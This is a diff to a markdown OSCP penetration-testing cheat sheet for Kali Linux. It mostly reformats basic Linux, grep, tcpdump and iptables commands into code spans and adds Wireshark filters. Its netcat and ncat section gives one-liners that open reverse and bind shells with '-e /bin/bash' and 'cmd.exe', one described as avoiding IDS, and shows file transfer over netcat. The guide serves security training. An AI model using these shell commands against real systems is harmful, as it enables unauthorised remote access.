@@ -9,6 +9,9 @@ Kali Linux Offensive Security Certified Professional Survival Exam Guide Playboo
    \___/\____/ \____/\_|     \____/ \__,_|_|    \_/ |_| \_/ \__,_|_|  \____/\__,_|_|\__,_|\___|
 </pre>
 
+ _**`NOTE: This document reffers to the target ip as the export variable $ip.  To set this value on the command line use the following syntax:
+export ip=192.168.1.100`**_  
+
 ## Table of Contents
 - [OSCP Course Review](#oscp-course-review)
 - [OSCP Inspired VMs and Walkthroughs](#oscp-inspired-vms-and-walkthroughs)
@@ -187,129 +190,140 @@ OSCP Course Review
     `locate sbd.exe`
 
 -   Search through directories in the $PATH environment variable  
-    which sbd
+    `which sbd`
 
 -   Find a search for a file that contains a specific string in it’s
     name:  
-    find / -name sbd\*
+    `find / -name sbd\*`
 
 -   Show active internet connections  
-    netstat -lntp
+    `netstat -lntp`
 
 -   Change Password  
-    passwd
+    `passwd`
 
 -   Verify a service is running and listening  
-    netstat -antp |grep apache
+    `netstat -antp |grep apache`
 
 -   Start a service  
-    systemctl start ssh  
-    systemctl start apache2
+    `systemctl start ssh  `
+    `systemctl start apache2`
 
 -   Unzip a gz file  
-    gunzip access.log.gz
+    `gunzip access.log.gz`
 
 -   Unzip a tar.gz file  
-    tar -xzvf file.tar.gz
+    `tar -xzvf file.tar.gz`
 
 -   Search command history  
-    history | grep phrase\_to\_search\_for
+    `history | grep phrase\_to\_search\_for`
 
 -   Have a service start at boot  
-    systemctl enable ssh
+    `systemctl enable ssh`
 
 -   Stop a service  
-    systemctl stop ssh
+    `systemctl stop ssh`
 
 -   Download a webpage  
-    wget [www.cisco.com](http://www.cisco.com)
+    `wget [www.cisco.com](http://www.cisco.com)`
 
 -   Open a webpage  
-    curl [www.cisco.com](http://www.cisco.com)
+    `curl [www.cisco.com](http://www.cisco.com)`
 
 -   String manipulation
 
     -   Count number of lines in file  
-        wc index.html
+        `wc index.html`
 
     -   Get the start or end of a file  
-        head index.html  
-        tail index.html
+        `head index.html  `
+        `tail index.html`
 
     -   Extract all the lines that contain a string  
-        grep "href=" index.html
+        `grep "href=" index.html`
 
     -   Cut a string by a delimiter, filter results then sort  
-        grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d
-        '"' -f 1 | sort -u
+        `grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u`
 
     -   Using Grep and regular expressions and output to a file  
-        cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 |
-        sort –u &gt; list.txt
+        `cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u &gt; list.txt`
 
     -   Use a bash loop to find the IP address behind each host  
-        for url in $(cat list.txt); do host $url; done
+        `for url in $(cat list.txt); do host $url; done`
 
     -   Collect all the IP Addresses from a log file and sort by
         frequency  
-        cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn
+        `cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn`
 
 -   Netcat - Read and write TCP and UDP Packets
 
     -   Connect to a POP3 mail server  
-        nc -nv $ip 110
+        `nc -nv $ip 110`
 
     -   Listen on TCP/UDP port  
-        nc -nlvp 4444
+        `nc -nlvp 4444`
 
     -   Connect to a netcat port  
-        nc -nv $ip 4444
+        `nc -nv $ip 4444`
 
     -   Send a file using netcat  
-        nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe
+        `nc -nv $ip 4444 &lt; /usr/share/windows-binaries/wget.exe`
 
     -   Receive a file using netcat  
-        nc -nlvp 4444 &gt; incoming.exe
+        `nc -nlvp 4444 &gt; incoming.exe`
 
     -   Create a reverse shell with Ncat using cmd.exe on Windows  
-        nc -nlvp 4444 -e cmd.exe
+        `nc -nlvp 4444 -e cmd.exe`
 
     -   Create a reverse shell with Ncat using bash on Linux  
-        nc -nv $ip 4444 -e /bin/bash
+        `nc -nv $ip 4444 -e /bin/bash`
 
 -   Ncat - Netcat for Nmap project which provides more security avoid
     IDS
 
     -   Reverse shell from windows using cmd.exe using ssl  
-        ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl
+        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`
 
     -   Listen on port 4444 using ssl  
-        ncat -v $ip 4444 --ssl
+        `ncat -v $ip 4444 --ssl`
 
--   Wireshark - is great
+-   Wireshark
+    -   Show only SMTP (port 25) and ICMP traffic:
+         `tcp.port eq 25 or icmp`
+        
+    -   Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:
+        `ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16`
+        
+    -   Filter by a protocol ( e.g. SIP ) and filter out unwanted IPs:
+        `ip.src != xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip`
+        
+    -   Some commands are equal
+        `ip.addr == 10.43.54.65`
+         Equals
+        `ip.src == 10.43.54.65 or ip.dst == 10.43.54.65 `
+
+        ` ip.addr != 10.43.54.65`
+         Equals
+         `ip.src != 10.43.54.65 or ip.dst != 10.43.54.65`
 
 -   Tcpdump
 
     -   Display a pcap file  
-        tcpdump -r password\_cracking\_filtered.pcap
+       `tcpdump -r password\_cracking\_filtered.pcap`
 
     -   Display ips and filter and sort  
-        tcpdump -n -r password\_cracking\_filtered.pcap | awk -F" "
-        '{print $3}' | sort -u | head
+        `tcpdump -n -r password\_cracking\_filtered.pcap | awk -F" " '{print $3}' | sort -u | head`
 
     -   Grab a packet capture on port 80  
-        tcpdump tcp port 80 -w output.pcap -i eth0
+        `tcpdump tcp port 80 -w output.pcap -i eth0`
 
     -   Check for ACK or PSH flag set in a TCP packet  
-        tcpdump -A -n 'tcp\[13\] = 24' -r
-        password\_cracking\_filtered.pcap
+        `tcpdump -A -n 'tcp\[13\] = 24' -r password\_cracking\_filtered.pcap`
 
 -   IPTables deny traffic to ports except for Local Loopback
 
-    -   iptables -A INPUT -p tcp --destination-port 13327 \\! -d $ip -j
-        DROP  
-        iptables -A INPUT -p tcp --destination-port 4444 \\! -d $ip -j
-        DROP
+    -   `iptables -A INPUT -p tcp --destination-port 13327 \\! -d $ip -j DROP  `
+        `iptables -A INPUT -p tcp --destination-port 4444 \\! -d $ip -j DROP`
 
 <span id="_8ycb0mapaec8" class="anchor"><span id="_Toc480741802" class="anchor"></span></span>Information Gathering & Vulnerability Scanning
 ============================================================================================================================================
